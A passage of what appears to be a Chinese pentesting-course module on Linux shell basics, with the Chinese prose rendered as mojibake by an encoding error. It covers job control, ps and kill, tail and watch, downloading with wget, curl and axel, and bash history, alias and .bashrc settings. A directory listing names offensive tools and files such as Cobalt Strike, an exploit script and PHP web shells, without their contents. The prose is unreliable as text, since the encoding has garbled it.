å›å¤å¯èƒ½ä¼šå›æ¥ï¼Œä½†å¦‚æœæ•°æ®åŒ…è¿›è¡Œæ—¶è¿›ç¨‹è¢«æš‚åœï¼Œè¿›ç¨‹å¯èƒ½ä¼šé”™è¿‡å®ƒï¼Œå¯¼è‡´ä¸æ­£ç¡®çš„è¾“å‡ºã€‚åœ¨è¿›è¡Œä½œä¸šæ§åˆ¶æ—¶ï¼Œè¦å§‹ç»ˆè€ƒè™‘ä½ æ­£åœ¨è¿è¡Œçš„å‘½ä»¤çš„èƒŒæ™¯ã€‚\n\n### å·¥ä½œæ§åˆ¶ï¼šjobs å’Œ fg\n\nä¸ºäº†å¿«é€Ÿæ£€æŸ¥æˆ‘ä»¬çš„ ICMP å›æ³¢è¯·æ±‚çš„çŠ¶æ€ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸¤ä¸ªé¢å¤–çš„å‘½ä»¤ï¼šjobs å’Œ fgã€‚\n\nå†…ç½®çš„ jobs å·¥å…·åˆ—å‡ºäº†å½“å‰ç»ˆç«¯ä¼šè¯ä¸­æ­£åœ¨è¿è¡Œçš„å·¥ï¼Œè€Œ fg åˆ™å°†ä¸€ä¸ªå·¥ä½œè¿”å›åˆ°å‰å°ã€‚ä¸‹é¢æ˜¯è¿™äº›å‘½ä»¤çš„æ“ä½œã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€#  ping -c 400 localhost > ping_results.txt\n^Z\nzsh: suspended  ping -c 400 localhost > ping_results.txt\n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# find / -name sbd.exe                                                                    \n^Z\nzsh: suspended  find / -name sbd.exe\n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# jobs                                                                                    \n[1]  - suspended  ping -c 400 localhost > ping_results.txt\n[2]  + suspended  find / -name sbd.exe\n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# fg %1                                                                                   \n[1]  - continued  ping -c 400 localhost > ping_results.txt\n^C                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# jobs                                                                                    \n[2]  + suspended  find / -name sbd.exe\n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# fg                                                                                      \n[2]  - continued  find / -name sbd.exe\n/usr/share/windows-resources/sbd/sbd.exe\n```\n\né¦–å…ˆï¼Œå¥‡ç‰¹çš„ **^C** å­—ç¬¦ä»£è¡¨æŒ‰é”®ç»„åˆ `Ctrl` `C` ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¿«æ·é”®æ¥ä¸­æ­¢ä¸€ä¸ªé•¿æœŸè¿è¡Œçš„è¿›ç¨‹ï¼Œé‡æ–°è·å–å¯¹ç»ˆç«¯çš„æ§åˆ¶ã€‚\n\nç¬¬äºŒï¼Œåœ¨ **fg %1** å‘½ä»¤ä¸­ä½¿ç”¨ â€œ%1â€ æ˜¯æ–°çš„ã€‚ åœ¨ shell ä¸­ï¼Œæœ‰å¤šç§æ–¹æ³•æ¥æŒ‡ä»£ä¸€é¡¹å·¥ä½œã€‚â€œ%â€ å­—ç¬¦åé¢è·Ÿç€ä¸€ä¸ª jobIDï¼Œä»£è¡¨ä¸€ä¸ªå·¥ä½œè§„èŒƒã€‚jobID å¯ä»¥æ˜¯ä¸€ä¸ªè¿›ç¨‹ IDï¼ˆPIDï¼‰å·ç ï¼Œæˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç¬¦å·ç»„åˆã€‚\n\n- %Numberï¼šæŒ‡çš„æ˜¯ä¸€ä¸ªå·¥ä½œç¼–å·ï¼Œå¦‚ %1 æˆ– %2\n- %Stringï¼šæŒ‡çš„æ˜¯æš‚åœçš„å‘½ä»¤åç§°çš„å¼€å¤´ï¼Œå¦‚ %commandNameHere æˆ– %ping\n- %+ æˆ– %%ï¼šæŒ‡çš„æ˜¯å½“å‰çš„å·¥ä½œ\n- %-ï¼šæŒ‡çš„æ˜¯å‰ä¸€ä¸ªå·¥ä½œ\n\n<aside> ğŸ’¡ å¦‚æœåªæœ‰ä¸€ä¸ªè¿›ç¨‹è¢«ç½®å…¥åå°ï¼Œåˆ™ä¸éœ€è¦å·¥ä½œç¼–å·ã€‚\n\n</aside>\n\n### è¿›ç¨‹æ§åˆ¶ï¼šps å’Œ kill\n\nåœ¨å¤§å¤šæ•°ç±»ä¼¼ Unix çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œç›‘è§†è¿›ç¨‹æœ€æœ‰ç”¨çš„å‘½ä»¤ä¹‹ä¸€æ˜¯ psï¼ˆè¿›ç¨‹çŠ¶æ€çš„ç®€ç§°ï¼‰ã€‚ä¸ jobs å‘½ä»¤ä¸åŒï¼Œps åˆ—å‡ºäº†å…¨ç³»ç»Ÿçš„è¿›ç¨‹ï¼Œè€Œä¸ä»…ä»…æ˜¯å½“å‰çš„ç»ˆç«¯ä¼šè¯ã€‚è¿™ä¸ªå·¥å…·è¢«è®¤ä¸ºæ˜¯ç±» Unix æ“ä½œç³»ç»Ÿçš„æ ‡å‡†ï¼Œå®ƒçš„åå­—è¢«å¹¿æ³›è®¤å¯ï¼Œç”šè‡³åœ¨ Windows PoweShell ä¸­ï¼Œps ä¹Ÿæ˜¯ Get-Process cmdlet çš„é¢„å®šä¹‰å‘½ä»¤åˆ«åï¼Œå®ƒçš„ä½œç”¨åŸºæœ¬ç›¸åŒã€‚\n\nä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•äººå‘˜ï¼Œåœ¨è·å¾—å¯¹ç³»ç»Ÿçš„è¿œç¨‹è®¿é—®åï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„æ˜¯äº†è§£è¢«æ”»å‡»æœºå™¨ä¸Šç›®å‰æ­£åœ¨è¿è¡Œä»€ä¹ˆè½¯ä»¶ã€‚è¿™å¯ä»¥å¸®åŠ©æˆ‘ä»¬æå‡æˆ‘ä»¬çš„æƒé™æˆ–æ”¶é›†æ›´å¤šçš„ä¿¡æ¯ï¼Œä»¥è·å¾—å¯¹ç½‘ç»œçš„æ–°ä¸€æ­¥è®¿é—®ã€‚\n\nä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œè®©æˆ‘ä»¬å¯åŠ¨ Leafpad æ–‡ä»¶ç¼–è¾‘å™¨ï¼Œç„¶åå°è¯•ä½¿ç”¨ ps å‘½ä»¤ä»å‘½ä»¤è¡Œä¸­æ‰¾åˆ°å…¶è¿›ç¨‹ IDï¼ˆPIDï¼‰ã€‚\n\n```bash\nkali@kali:~$ ps -ef\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot           1       0  0 10:18 ?       00:00:02 /sbin/init\nroot           2       0  0 10:18 ?       00:00:00 [kthreadd]\nroot           3       2  0 10:18 ?       00:00:00 [rcu_gp]\nroot           4       2  0 10:18 ?       00:00:00 [rcu_par_gp]\nroot           5       2  0 10:18 ?       00:00:00 [kworker/0:0-events]\nroot           6       2  0 10:18 ?       00:00:00 [kworker/0:0H-kblockd]\nroot           7       2  0 10:18 ?       00:00:00 [kworker/u256:0-events_unbound\nroot           8       2  0 10:18 ?       00:00:00 [mm_percpu_wq]\nroot           9       2  0 10:18 ?       00:00:00 [ksoftirqd/0]\nroot          10       2  0 10:18 ?       00:00:00 [rcu_sched]\n```\n\næˆ‘ä»¬ä¸Šé¢ä½¿ç”¨çš„ **-ef** é€‰é¡¹ä»£è¡¨äº†ï¼š\n\n- eï¼šé€‰æ‹©æ‰€æœ‰è¿›ç¨‹\n- fï¼šæ˜¾ç¤ºå®Œæ•´çš„æ ¼å¼åˆ—è¡¨ï¼ˆUIDï¼ŒPIDï¼ŒPPIDï¼Œç­‰ç­‰ï¼‰\n\nåœ¨è¿™ä¸ªåºå¤§çš„åˆ—è¡¨ä¸­æ‰¾åˆ°æˆ‘ä»¬ Leafpad åº”ç”¨ç¨‹åºç»å¯¹ä¸å®¹æ˜“ï¼Œä½†ç”±äºæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„åº”ç”¨ç¨‹åºåç§°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ -cï¼ˆæŒ‰å‘½ä»¤åç§°é€‰æ‹©ï¼‰ä»£æ›¿ -e é€‰é¡¹ï¼Œå¦‚ä¸‹ï¼š\n\n```bash\nkali@kali:~$ ps -fC leafpad\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot       56551   56371  1 23:22 pts/0    00:00:00 leafpad\n```\n\nè¿›ç¨‹æœç´¢è¿”å›äº†ä¸€ä¸ªç»“æœï¼Œæˆ‘ä»¬ä»ä¸­æ”¶é›†äº† Leafpad çš„ PIDã€‚èŠ±äº›æ—¶é—´æ¥æ¢ç´¢å‘½ä»¤æ‰‹å†Œï¼ˆman psï¼‰ï¼Œå› ä¸º ps ç¡®å®æ˜¯è¿›ç¨‹ç®¡ç†çš„ç‘å£«å†›åˆ€ã€‚\n\nå‡è®¾æˆ‘ä»¬é€‰æ‹©æƒ³åœ¨ä¸åŒä¸ GUI äº¤äº’çš„æƒ…å†µä¸‹åœæ­¢ Leafpad è¿›ç¨‹ã€‚kill å‘½ä»¤åœ¨è¿™é‡Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬ï¼Œå› ä¸ºå®ƒçš„ç›®çš„æ˜¯å‘ä¸€ä¸ªè¿›ç¨‹å‘é€ä¸€ä¸ªç‰¹å®šçš„ä¿¡å·ã€‚ä¸ºäº†ä½¿ç”¨ killï¼Œæˆ‘ä»¬éœ€è¦æˆ‘ä»¬æƒ³å‘é€ä¿¡å·çš„è¿›ç¨‹çš„ PIDã€‚ç”±äºæˆ‘ä»¬åœ¨ä¸Šä¸€æ­¥ä¸­æ”¶é›†äº† Leafpad çš„ PIDï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# kill 56551                                             \n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€#  ps aux | grep leafpad\nroot       56596  0.0  0.0   7616   884 pts/1    S+   23:27   0:00 grep --color=auto leafpad\n```\n\nå› ä¸º kill çš„é»˜è®¤ä¿¡å·æ˜¯ SIGTERMï¼ˆè¯·æ±‚ç»ˆæ­¢ï¼‰ï¼Œæˆ‘ä»¬çš„åº”ç”¨ç¨‹åºå·²ç»è¢«ç»ˆæ­¢äº†ã€‚é€šè¿‡æ€æ­» Leafpad åä½¿ç”¨ ps éªŒè¯äº†è¿™ä¸€ç‚¹ã€‚\n\n## æ–‡ä»¶å’Œå‘½ä»¤ç›‘æ§\n\nåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼ŒçŸ¥é“å¦‚ä½•å®æ—¶ç›‘æ§æ–‡ä»¶å’Œå‘½ä»¤æ˜¯éå¸¸æœ‰ä»·å€¼çš„ã€‚ä¸¤ä¸ªæœ‰åŠ©äºå®Œæˆæ­¤ç±»ä»»åŠ¡çš„å‘½ä»¤æ˜¯ tail å’Œ watchã€‚\n\n### Tail\n\ntail æœ€å¸¸è§çš„ç”¨é€”æ˜¯ç›‘è§†æ­£åœ¨å†™å…¥çš„æ—¥å¿—æ–‡ä»¶æ¡ç›®ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³ç›‘è§† Apache çš„æ—¥å¿—ï¼Œçœ‹çœ‹ä¸€ä¸ª Web æœåŠ¡å™¨æ˜¯å¦è¢«æˆ‘ä»¬è¯•å›¾é€šè¿‡å®¢æˆ·ç«¯æ”»å‡»çš„ç‰¹å®šå®¢æˆ·è”ç³»åˆ°ã€‚è¿™ä¸ªä¾‹å­å°±å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼š\n\n```bash\nkali@kali:~$ sudo tail -f /var/log/apache2/access.log\n127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] \"GET / HTTP/1.1\" 200 3380 \"-\" \"Mozilla/5.0\n(X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\"\n127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] \"GET /icons/openlogo-75.png HTTP/1.1\" 200\n6040 \"<http://127.0.0.1/>\" \"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101\nFirefox/52.0\"\n127.0.0.1 - - [02/Feb/2018:12:18:15 -0500] \"GET /favicon.ico HTTP/1.1\" 404 500 \"-\"\n\"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\"\n```\n\n`-f` é€‰é¡¹ï¼ˆfollowï¼‰æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒéšç€ç›®æ ‡æ–‡ä»¶çš„å¢é•¿ä¸æ–­åœ°æ›´æ–°è¾“å‡ºã€‚å¦ä¸€ä¸ªæ–¹ä¾¿çš„é€‰é¡¹æ˜¯ `-nX` ï¼Œå®ƒè¾“å‡ºæœ€åçš„ â€œXâ€ è¡Œæ•°ï¼Œè€Œä¸æ˜¯é»˜è®¤å€¼ 10ã€‚\n\n### Watch\n\nwatch å‘½ä»¤ç”¨äºå®šæœŸè¿è¡Œä¸€ä¸ªç‰¹å®šçš„å‘½ä»¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒæ¯ä¸¤ç§’è¿è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ `-n` `X` é€‰é¡¹æŒ‡å®šä¸åŒçš„é—´éš”ã€‚è®©å®ƒæ¯ â€œXâ€ ç§’è¿è¡Œä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œè¿™ä¸ªå‘½ä»¤å°†æ¯éš” 5 ç§’åˆ—å‡ºç™»å½•çš„ç”¨æˆ·ï¼ˆé€šè¿‡ w å‘½ä»¤ï¼‰ä¸€æ¬¡ã€‚\n\n```bash\nkali@kali:~$ watch -n 5 w\n...........\nEvery 5.0s: w                                                 kali: Thu Mar 17 00:28:16 2022\n\n 00:28:16 up 2 days, 18:30,  1 user,  load average: 0.56, 0.82, 0.94\nUSER     TTY      æ¥è‡ª           LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     tty7     :0               282æœˆ22 15days 10:18  10:18  /usr/lib/xorg/Xorg :0 -seat\n```\n\nè¦ç»ˆæ­¢ watch å‘½ä»¤å¹¶è¿”å›åˆ°äº¤äº’å¼ç»ˆç«¯ï¼Œä½¿ç”¨ `Ctrl` `C` ã€‚\n\n## ä¸‹è½½æ–‡ä»¶\n\næ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ä¸€äº›å¯ä»¥ä»å‘½ä»¤è¡Œä¸‹è½½æ–‡ä»¶åˆ° Linux ç³»ç»Ÿçš„å·¥å…·ã€‚\n\n### Wget\n\næˆ‘ä»¬å°†å¹¿æ³›ä½¿ç”¨çš„ wget å‘½ä»¤ï¼Œä½¿ç”¨ HTTP/HTTPS å’Œ FTP åè®®ä¸‹è½½æ–‡ä»¶ã€‚ä¸‹é¢æ˜¾ç¤ºäº† wegt å’Œ `-O` é€‰é¡¹çš„ä½¿ç”¨æƒ…å†µï¼Œä»¥åœ¨æœ¬åœ°æœºå™¨ä¸Šç”¨ä¸åŒçš„åå­—ä¿å­˜ç›®æ ‡æ–‡ä»¶ã€‚\n\n```bash\nkali@kali:~$ wget -O report_wget.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\n--2018-01-28 20:30:04-- <https://www.offensive-security.com/reports/penetration-testin>\nResolving www.offensive-security.com (www.offensive-security.com)... 192.124.249.5\nConnecting to www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:4\nHTTP request sent, awaiting response... 200 OK\nLength: 27691955 (26M) [application/pdf]\nSaving to: â€˜report_wget.pdfâ€™\nreport_wget.pdf 100%[===================>] 26.41M 766KB/s in 28s\n\n2018-01-28 20:30:33 (964 KB/s) - â€˜report_wget.pdfâ€™ saved [27691955/27691955]\n```\n\n### Curl\n\ncurl æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸€ç³»åˆ—åè®®å‘æœåŠ¡å™¨ä¼ è¾“æ•°æ®çš„å·¥å…·ï¼ŒåŒ…æ‹¬ IMAP/S,POP3/S,SCP,SFTP,SMB/S,SMTP/S,TELNET,TFTP ç­‰ã€‚æ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥ç”¨å®ƒæ¥ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶å¹¶å»ºç«‹å¤æ‚çš„è¯·æ±‚ã€‚å®ƒæœ€åŸºæœ¬çš„ç”¨é€”ä¸ wget éå¸¸ç›¸ä¼¼ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl -o report.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\n```\n\n### Axel\n\naxel æ˜¯ä¸€ä¸ªä¸‹è½½åŠ é€Ÿå™¨ï¼Œé€šè¿‡å¤šä¸ªè¿æ¥ä» FTP æˆ– HTTP æœåŠ¡å™¨ä¼ è¾“æ–‡ä»¶ã€‚è¿™ä¸ªå·¥å…·æœ‰å¤§é‡çš„åŠŸèƒ½ï¼Œä½†æœ€å¸¸è§çš„æ˜¯ `-n` ï¼Œç”¨æ¥æŒ‡å®šè¦ä½¿ç”¨çš„å¤šä¸ªè¿æ¥çš„æ•°é‡ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬è¿˜ä½¿ç”¨äº† `-a` é€‰é¡¹ï¼Œä»¥è·å¾—æ›´ç®€æ´çš„è¿›åº¦æŒ‡ç¤ºå™¨ï¼Œå¹¶ä½¿ç”¨ `-o` ä¸ºä¸‹è½½çš„æ–‡ä»¶æŒ‡å®šä¸€ä¸ªä¸åŒçš„æ–‡ä»¶åã€‚\n\n```bash\nkali@kali:~$ axel -a -n 20 -o report_axel.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\nInitializing download: <https://www.offensive-security.com/reports/penetration-testingFile> size: 27691955 bytes\nOpening output file report_axel.pdf\nStarting download\n\nConnection 0 finished\nConnection 1 finished\nConnection 2 finished\nConnection 3 finished\nConnection 4 finished\nConnection 5 finished\nConnection 6 finished\nConnection 7 finished\nConnection 8 finished\nConnection 9 finished\nConnection 10 finished\nConnection 11 finished\nConnection 13 finished\nConnection 14 finished\nConnection 15 finished\nConnection 16 finished\nConnection 18 finished\n[100%]\n[ ..............................................................................................................................................................] [11.1MB/s] [00:00]\n\nDownloaded 26.4 Megabyte in 2 seconds. (11380.17 KB/s)\n```\n\n## è‡ªå®šä¹‰ Bash ç¯å¢ƒ\n\n### Bash å†å²çš„å®šåˆ¶\n\nåœ¨æœ¬æ¨¡å—çš„å‰é¢ï¼Œæˆ‘ä»¬è®¨è®ºäº†ç¯å¢ƒå˜é‡å’Œå†å²å‘½ä»¤ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›ç¯å¢ƒå˜é‡æ¥æ”¹å˜å†å²å‘½ä»¤çš„æ“ä½œå’Œè¿”å›æ•°æ®çš„æ–¹å¼ï¼Œæœ€å¸¸è§çš„åŒ…æ‹¬ HISTCONTROLã€HISTIGNORE å’Œ HISTTIMEFORMATã€‚HISTCONTROL å˜é‡å®šä¹‰äº†æ˜¯å¦ä»å†å²è®°å½•ä¸­åˆ é™¤é‡å¤çš„å‘½ä»¤ã€ä»¥ç©ºæ ¼å¼€å¤´çš„å‘½ä»¤æˆ–ä¸¤è€…ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸¤è€…éƒ½è¢«åˆ é™¤ï¼Œä½†ä½ å¯èƒ½ä¼šå‘ç°åªåˆ é™¤é‡å¤çš„å‘½ä»¤æ›´æœ‰ç”¨ã€‚\n\n```bash\nkali@kali:~$ export HISTCONTROL=ignoredups\n```\n\nHISTIGNORE å˜é‡å¯¹äºè¿‡æ»¤æ‰ç»å¸¸è¿è¡Œçš„åŸºæœ¬å‘½ä»¤ç‰¹åˆ«æœ‰ç”¨ï¼Œå…¥ lsã€exitã€historyã€bg ç­‰ã€‚\n\n```bash\nkali@kali:~$ export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n\nkali@kali:~$ mkdir test\n\nkali@kali:~$ cd test\n\nkali@kali:~/test$ ls\n\nkali@kali:~/test$ pwd\n/home/kali/test\n\nkali@kali:~/test$ ls\n\nkali@kali:~/test$ history\n 1 export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n 2 mkdir test\n 3 cd test\n 4 pwd\n\nkali@kali:~/test$ export HISTTIMEFORMAT='%F %T '\n\nkali@kali:~/test$ history\n 1 2018-02-12 13:37:33 export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n 2 2018-02-12 13:37:38 mkdir test\n 3 2018-02-12 13:37:40 cd test\n 4 2018-02-12 13:37:43 pwd\n 5 2018-02-12 13:37:51 export HISTTIMEFORMAT='%F %T '\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† %F(å¹´-æœˆ-æ—¥ ISO 8601 æ ¼å¼) å’Œ %T(24 å°æ—¶æ—¶é—´)ã€‚å…¶ä»–æ ¼å¼å¯ä»¥åœ¨ strftime æ‰‹å†Œæ‰¾åˆ°ã€‚\n\n### Alias\n\nAlias æ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥å®šä¹‰çš„å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ›¿ä»£ä¸€ä¸ªå‘½ä»¤çš„åˆ«ç§°ã€‚Alias å¯¹äºæˆ‘ä»¬å®šä¹‰çš„æ›´çŸ­çš„å‘½ä»¤æˆ–åˆ«åæ¥æ›¿æ¢å¸¸ç”¨çš„å‘½ä»¤å’Œé€‰é¡¹éå¸¸æœ‰ç”¨ã€‚æ¢å¥è¯è¯´ï¼ŒAlias æ˜¯æˆ‘ä»¬å®šä¹‰çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”±å…¶ä»–å‘½ä»¤ç»„æˆã€‚è¿™æ–¹é¢çš„ä¸€ä¸ªä¾‹å­æ˜¯ ls å‘½ä»¤ï¼Œæˆ‘ä»¬é€šå¸¸å€¾å‘äºä½¿ç”¨ ls -laï¼ˆæ˜¾ç¤ºç»“æœä¸ºä¸€ä¸ªé•¿åˆ—è¡¨ï¼ŒåŒ…æ‹¬éšè—çš„æ–‡ä»¶ï¼‰ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ Alias æ¥å–ä»£è¿™ä¸ªå‘½ä»¤ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# alias lsa='ls -la'\n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# lsa    \næ€»ç”¨é‡ 544\ndrwxr-xr-x   5 root root   4096  3æœˆ 16 22:52  .\ndrwx------  30 root root   4096  3æœˆ 17 00:27  ..\n-rw-r--r--   1 root root 141136  3æœˆ 16 00:56  access.log\n-rwxr-xr-x   1 root root    223  3æœˆ  2 20:33  Anbox.desktop\ndrwxr-xr-x   3 root root   4096  4æœˆ 21  2021  cobaltstrike4\n-rw-------   1 root root   7733 12æœˆ 10 02:12  CVE-2021-43798.py\n-rwxr-xr-x   1 root root    180  1æœˆ  5 01:51 'Google Chrome.desktop'\ndrwxr-xr-x   4 root root   4096  3æœˆ 14 01:12  HTB\n-rw-r--r--   1 root root     88  3æœˆ 16 04:17  intro_to_nano.txt\n-rwxr-xr-x   1 root root 332111  2æœˆ 19 03:06  linpeas.sh\n-rw-------   1 root root   9185  3æœˆ  1 00:17  Lucifiel.ovpn\n-rw-------   1 root root    455 12æœˆ 10 02:12  paload.txt\n-rw-r--r--   1 root root   3459  1æœˆ 19 22:03  phpshell.php\n-rw-r--r--   1 root root    636  3æœˆ 17 00:19  ping_results.txt\n-rw-r--r--   1 root root     60  3æœˆ 16 22:00  scan-a.txt\n-rw-r--r--   1 root root     60  3æœˆ 16 22:00  scan-b.txt\n-rw-r--r--   1 root root     36  9æœˆ 26 22:02  shell.php\ndrwxr-xr-x 109 root root   4096  3æœˆ 16 00:10  vulhub\n```\n\né€šè¿‡å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤ lsaï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿæ‰§è¡Œ ls -laï¼Œè€Œæ ¹æœ¬ä¸éœ€è¦è¾“å…¥ä»»ä½•å‚æ•°ã€‚æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡è¿è¡Œä¸å¸¦å‚æ•°çš„ alias æ¥æŸ¥çœ‹å®šä¹‰çš„åˆ«ååˆ—è¡¨ã€‚\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼šalias å‘½ä»¤å¯¹ç”¨äºåˆ«åçš„å•è¯æ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚å› æ­¤ï¼Œæœ‰å¯èƒ½ä½¿ç”¨ä¸€ä¸ªå·²ç»å¯¹åº”äºç°æœ‰å‘½ä»¤çš„è¯æ¥åˆ›å»ºä¸€ä¸ªåˆ«åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸‹é¢è¿™ä¸ªç›¸å½“éšæ„çš„ä¾‹å­ä¸­çœ‹åˆ°è¿™ä¸€ç‚¹ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# alias mkdir='ping -c 1 localhost'\n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# mkdir                       \nPING localhost(localhost (::1)) 56 data bytes\n64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.075 ms\n\n--- localhost ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.075/0.075/0.075/0.000 ms\n```\n\nå¦‚æœå‡ºç°è¿™æ ·çš„æƒ…å†µï¼Œè§£å†³åŠæ³•å¾ˆç®€å•ã€‚æˆ‘ä»¬å¯ä»¥é€€å‡ºå½“å‰çš„ shell ä¼šè¯ï¼Œæˆ–è€…ä½¿ç”¨ unalias å‘½ä»¤æ¥å–æ¶ˆè¿è§„çš„åˆ«åã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# unalias mkdir          \n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# mkdir\nmkdir: ç¼ºå°‘æ“ä½œæ•°\nè¯·å°è¯•æ‰§è¡Œ \"mkdir --help\" æ¥è·å–æ›´å¤šä¿¡æ¯ã€‚\n```\n\n### æŒä¹…çš„ Bash å®šåˆ¶\n\nBash ä¸­äº¤äº’å¼ Shell çš„è¡Œä¸ºæ˜¯ç”±ä½äº /etc/bash.bashrc çš„å…¨ç³»ç»Ÿ bashrc æ–‡ä»¶å†³å®šçš„ã€‚å…¨ç³»ç»Ÿçš„ Bash è®¾ç½®å¯ä»¥é€šè¿‡ç¼–è¾‘ä½äºä»»ä½•ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ .bashrc æ–‡ä»¶è€Œè¢«æ¨ç¿»ã€‚\n\nåœ¨ä¸Šä¸€å±Šä¸­ï¼Œæˆ‘ä»¬æ¢è®¨äº† alias å‘½ä»¤ï¼Œå®ƒä¸ºå½“å‰çš„ç»ˆç«¯ä¼šè¯è®¾ç½®ä¸€ä¸ªåˆ«åã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ .bashrc æ–‡ä»¶ä¸­æ’å…¥åˆæ ¼å‘½ä»¤ï¼Œä»¥è®¾ç½®ä¸€ä¸ªæŒä¹…çš„åˆ«åã€‚.bashrc è„šæœ¬åœ¨è¯¥ç”¨æˆ·ç™»å½•çš„ä»»ä½•æ—¶å€™éƒ½ä¼šè¢«æ‰§è¡Œã€‚ç”±äºè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ª shell è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥ä»»ä½•å¯ä»¥ä»å‘½ä»¤æç¤ºç¬¦ä¸­æ‰§è¡Œçš„å‘½ä»¤ã€‚è®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ Kali Linux ä¸­é»˜è®¤çš„ /home/kali/.bashrc æ–‡ä»¶çš„å‡ è¡Œã€‚\n\n```bash\nkali@kali:~$ cat ~/.bashrc\n# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n...\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -\n alias ls='ls --color=auto'\n...\n```\n\nä½ 